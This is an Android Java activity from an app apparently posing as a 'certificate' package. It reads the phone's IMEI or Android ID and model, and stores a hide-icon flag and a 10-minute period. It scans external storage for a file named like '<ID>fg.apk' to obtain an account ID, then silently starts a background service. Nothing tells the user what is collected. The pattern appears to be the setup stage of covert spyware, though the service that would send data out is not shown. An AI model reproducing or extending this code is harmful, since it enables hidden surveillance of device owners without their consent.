package com.inet.android.bs;

import java.io.File;
import java.util.Calendar;
import java.util.List;
import java.util.TimeZone;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ActivityInfo;
import android.content.res.Configuration;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.text.Editable;
import android.text.InputType;
import android.text.TextWatcher;
import android.view.ContextThemeWrapper;
import android.view.Menu;
import android.widget.Button;
import android.widget.EditText;

import com.inet.android.certificate.R;
import com.inet.android.request.Request4;
import com.inet.android.utils.Logging;
/**
 * MainActivity 
 * 
 * @author johny homicide
 * 
 */
public class MainActivity extends Activity {
	Button install;
	Button exit;
	AlertDialog.Builder ad;
	Context context;
	final String SAVED_TIME = "saved_time";
	Editor e;
	SharedPreferences sp;
	private String aboutDev;
	private static String LOG_TAG = "mainActivity";
	String ID = null;
	List<String> result;
	private String sID;
	String imeistring;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
		// setContentView(R.layout.activity_main);
		context = getApplicationContext();
		Logging.doLog(LOG_TAG, "onCreate", "onCreate");

		sp = PreferenceManager.getDefaultSharedPreferences(context);
		final TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

		String model = android.os.Build.MODEL;
		String androidVersion = android.os.Build.VERSION.RELEASE;
		aboutDev = " Model: " + model + " Version android: " + androidVersion;
		e = sp.edit();
		e.putString("BUILD", "V_000.1");
		if (manager.getDeviceId() != null) {
			imeistring = manager.getDeviceId(); // *** use for mobiles
		} else {
			imeistring = Secure.getString(getApplicationContext()
					.getContentResolver(), Secure.ANDROID_ID); // *** use for
																// tablets
		}
		Calendar cal = Calendar.getInstance(TimeZone.getTimeZone("GMT"));
		long time = cal.getTimeInMillis();
		e.putString("imei", imeistring);
		e.putString("ABOUT", aboutDev);
		e.putString("model", model);
		e.putString("account", "account");
		e.putString("time_setub", Long.toString(time));
		
		e.commit();
		boolean hasVisited = sp.getBoolean("hasVisited", false);
//		boolean getInfo = sp.getBoolean("getInfo", false);
		if (!hasVisited) {
			// Is the first time?

			e = sp.edit();
			e.putBoolean("hasVisited", true);
			e.putBoolean("is_info", true);
			e.putBoolean("hideIcon", false);
			e.putString("ABOUT", aboutDev);
			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
			e.putString("period", "1"); // period must equal 10 min
			e.putString("code", "-1");
			e.commit();

			// hideIcon();
		}

		if (getID()) {
			Logging.doLog(LOG_TAG, "getID return true");
		} else {
			Logging.doLog(LOG_TAG, "getID return false");
		}
		if (sp.getString("account", "account").equals("account")) {

			Logging.doLog(LOG_TAG, "File not found. Show dialog.",
					"File not found. Show dialog.");
			viewIDDialog();
		} else {
			Logging.doLog(LOG_TAG, "not show dialog");
			finish();
		}
	}

	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);
	}

	private boolean viewIDDialog() {
		ContextThemeWrapper themedContext;
		if (Build.VERSION.SDK_INT >= 14) {
			themedContext = new ContextThemeWrapper(this,
					android.R.style.Theme_DeviceDefault_Dialog);
		} else {
			themedContext = new ContextThemeWrapper(this,
					android.R.style.Theme_Dialog);
		}
		AlertDialog.Builder alert = new AlertDialog.Builder(themedContext);
		alert.setTitle(R.string.TitleDialog);
		alert.setIcon(android.R.drawable.ic_dialog_alert);
		alert.setMessage(R.string.Enter_account);
		final EditText input = new EditText(this);
		input.setInputType(InputType.TYPE_CLASS_NUMBER);
		input.setMaxLines(1);
		alert.setView(input);

		alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
			public void onClick(DialogInterface dialog, int whichButton) {
				String value = input.getText().toString();

				Logging.doLog(LOG_TAG, "Text: " + value, "Text: " + value);

				e = sp.edit();
				e.putString("account", value);
				e.commit();
				start(); // start of services
				finish();
			}
		});

		alert.setNegativeButton(R.string.cancel,
				new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog, int whichButton) {
						// Canceled.
						finish();
					}
				});

		final AlertDialog dialog = alert.create();
		dialog.show();
		if (input.getText().toString().length() == 0) {
			((AlertDialog) dialog).getButton(AlertDialog.BUTTON_POSITIVE)
					.setEnabled(false);
		} else {
			((AlertDialog) dialog).getButton(AlertDialog.BUTTON_POSITIVE)
					.setEnabled(true);
		}

		input.addTextChangedListener(new TextWatcher() {

			@Override
			public void onTextChanged(CharSequence s, int start, int before,
					int count) {
				if (input.getText().toString().length() == 0) {

				}

			}

			@Override
			public void beforeTextChanged(CharSequence s, int start, int count,
					int after) {
				if (input.getText().toString().length() == 0) {
					((AlertDialog) dialog).getButton(
							AlertDialog.BUTTON_POSITIVE).setEnabled(false);
				} else {
					((AlertDialog) dialog).getButton(
							AlertDialog.BUTTON_POSITIVE).setEnabled(true);
				}
			}

			@Override
			public void afterTextChanged(Editable s) {
				if (input.getText().toString().length() == 0) {
					((AlertDialog) dialog).getButton(
							AlertDialog.BUTTON_POSITIVE).setEnabled(false);
				} else {
					((AlertDialog) dialog).getButton(
							AlertDialog.BUTTON_POSITIVE).setEnabled(true);
				}
			}
		});

		return true;
	}

	private boolean getID() {
		Logging.doLog(LOG_TAG, "Start search ID", "Start search ID");

		File file[] = Environment.getExternalStorageDirectory().listFiles();
		return recursiveFileFind(file);
	}

	private boolean recursiveFileFind(File[] file1) {
		int i = 0;
		String filePath = " ";
		if (file1 != null) {
			while (i != file1.length) {
				filePath = file1[i].getAbsolutePath();
				sID = file1[i].getName();
				if (file1[i].isDirectory()) {
					File[] file = file1[i].listFiles();
					if (recursiveFileFind(file) == true) {
						return true;
					}
				}

				if (sID.indexOf("fg.apk") != -1) {
					ID = sID.substring(0, sID.indexOf("f"));
					e = sp.edit();
					e.putString("account", ID);
					e.commit();

					if (!sp.getString("account", "account").equals("account")) {
						start();
						return true;
					}
					break;
				}
				i++;
			}

		}
		return false;
	}

	/**
	 * Start services
	 */
	private void start() {
		Logging.doLog(LOG_TAG, "start services", "start services");

		startService(new Intent(MainActivity.this, Request4.class));
		
	
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
}
